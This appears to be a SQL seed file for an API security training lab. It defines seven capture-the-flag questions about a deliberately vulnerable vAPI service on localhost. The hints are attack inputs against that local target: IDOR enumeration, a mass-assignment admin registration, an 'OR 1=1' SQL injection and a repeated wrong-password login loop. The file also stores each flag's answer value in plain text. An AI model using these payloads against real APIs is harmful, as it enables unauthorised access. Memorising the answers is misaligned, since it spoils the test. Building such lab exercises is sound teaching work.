INSERT INTO "Lab" ("id", "name", "slug", "description", "createdAt", "updatedAt") VALUES ('19200b65-cad3-4667-9c99-67a384e89b73', 'vAPI - API Security', 'vapi-api-security', 'REST API security testing with vAPI on port 3000', NOW(), NOW()) ON CONFLICT ("id") DO NOTHING;
INSERT INTO "Flag" ("id", "labId", "position", "question", "hint", "answerHash", "value", "points", "createdAt", "updatedAt") VALUES ('b6e896fa-424c-4c1f-bf2e-ba37a2539c61', '19200b65-cad3-4667-9c99-67a384e89b73', 1, 'Run: curl http://localhost:3000/api/users. What HTTP status code or message is returned when accessing the users endpoint without authentication?', 'curl http://localhost:3000/api/users', '$2b$10$VyhX6a7mrUVtpG5cNGli5uV2a9H1bf7591Et/M8nxAF7ozVQIHEVG', 'API_ENDPOINT_FOUND', 10, NOW(), NOW()) ON CONFLICT ("id") DO NOTHING;
INSERT INTO "Flag" ("id", "labId", "position", "question", "hint", "answerHash", "value", "points", "createdAt", "updatedAt") VALUES ('71efeebf-61a1-44e6-8034-8fdfed3981e3', '19200b65-cad3-4667-9c99-67a384e89b73', 2, 'Run: curl -X GET http://localhost:3000/api/admin. What response do you get when accessing the admin endpoint without an Authorization header?', 'curl -X GET http://localhost:3000/api/admin', '$2b$10$bmDDhHXxNuL3xQsdf4hbw.itgkyNhMqiagHKyaVM4YoBuB8cxyKau', 'BROKEN_AUTH_DETECTED', 20, NOW(), NOW()) ON CONFLICT ("id") DO NOTHING;
INSERT INTO "Flag" ("id", "labId", "position", "question", "hint", "answerHash", "value", "points", "createdAt", "updatedAt") VALUES ('fd407e67-79a9-4c5c-a79c-a92b253776f5', '19200b65-cad3-4667-9c99-67a384e89b73', 3, 'Run: curl http://localhost:3000/api/users/1 and then curl http://localhost:3000/api/users/2. Do both requests return different user data? What fields are exposed?', 'curl http://localhost:3000/api/users/1 && curl http://localhost:3000/api/users/2', '$2b$10$qn6YublsMxAITVqD/zTobu9RyRGLlNa5FhBlLkvypbEtP1wS93C/G', 'IDOR_EXPLOITED', 30, NOW(), NOW()) ON CONFLICT ("id") DO NOTHING;
INSERT INTO "Flag" ("id", "labId", "position", "question", "hint", "answerHash", "value", "points", "createdAt", "updatedAt") VALUES ('27bbb199-26be-4a09-923d-842356eb3a15', '19200b65-cad3-4667-9c99-67a384e89b73', 4, 'Run: curl -X POST http://localhost:3000/api/register -H "Content-Type: application/json" -d {"username":"test","password":"test123","role":"admin"}. What response is returned when you add an extra role field?', 'curl -X POST http://localhost:3000/api/register -H "Content-Type: application/json" -d {"username":"test","password":"test123","role":"admin"}', '$2b$10$Do1ql9xlWImjRsztBMw4/uWH60DccB.TVKsc7CQGAMEDly5F/abru', 'MASS_ASSIGNMENT_FOUND', 40, NOW(), NOW()) ON CONFLICT ("id") DO NOTHING;
INSERT INTO "Flag" ("id", "labId", "position", "question", "hint", "answerHash", "value", "points", "createdAt", "updatedAt") VALUES ('6f0d4ed3-8406-4ca3-aa2c-c7653d750b24', '19200b65-cad3-4667-9c99-67a384e89b73', 5, 'Run: curl "http://localhost:3000/api/products?id=1 OR 1=1". What product data is returned when injecting a tautology in the query parameter?', 'curl "http://localhost:3000/api/products?id=1 OR 1=1"', '$2b$10$yP7PTl4vEqPCzfOfoh27wePu4tKcS2dZI6C.jnmHR4lTa4CnpeH0e', 'SQLI_IN_API_FOUND', 50, NOW(), NOW()) ON CONFLICT ("id") DO NOTHING;
INSERT INTO "Flag" ("id", "labId", "position", "question", "hint", "answerHash", "value", "points", "createdAt", "updatedAt") VALUES ('6ff9bc6b-df5c-4525-8677-28442cfc7a01', '19200b65-cad3-4667-9c99-67a384e89b73', 6, 'Run: curl -v http://localhost:3000/api/users/1. What sensitive information (email, phone, internal IDs) is returned in the response body?', 'curl -v http://localhost:3000/api/users/1', '$2b$10$Cio1AatGe0wHHfGeOEBrbeRB1tmydBTgxpzBYAGe.B6vBoQY.tw7y', 'EXCESSIVE_DATA_EXPOSURE', 60, NOW(), NOW()) ON CONFLICT ("id") DO NOTHING;
INSERT INTO "Flag" ("id", "labId", "position", "question", "hint", "answerHash", "value", "points", "createdAt", "updatedAt") VALUES ('a34b4318-fdeb-4039-945e-f8d6ccd8a47d', '19200b65-cad3-4667-9c99-67a384e89b73', 7, 'Run: for i in $(seq 1 10); do curl -s -o /dev/null -w "%{http_code} " http://localhost:3000/api/login -X POST -H "Content-Type: application/json" -d {"username":"admin","password":"wrong"}; done. What HTTP codes appear after rapid login attempts?', 'for i in $(seq 1 10); do curl -s -o /dev/null -w "%{http_code} " http://localhost:3000/api/login -X POST -H "Content-Type: application/json" -d {"username":"admin","password":"wrong"}; done', '$2b$10$V6Ci4hcbgpz/9mKrEWJhne583tQqajePw7D/oFxHv2/F4ZycmT6tm', 'RATE_LIMIT_TESTED', 70, NOW(), NOW()) ON CONFLICT ("id") DO NOTHING;
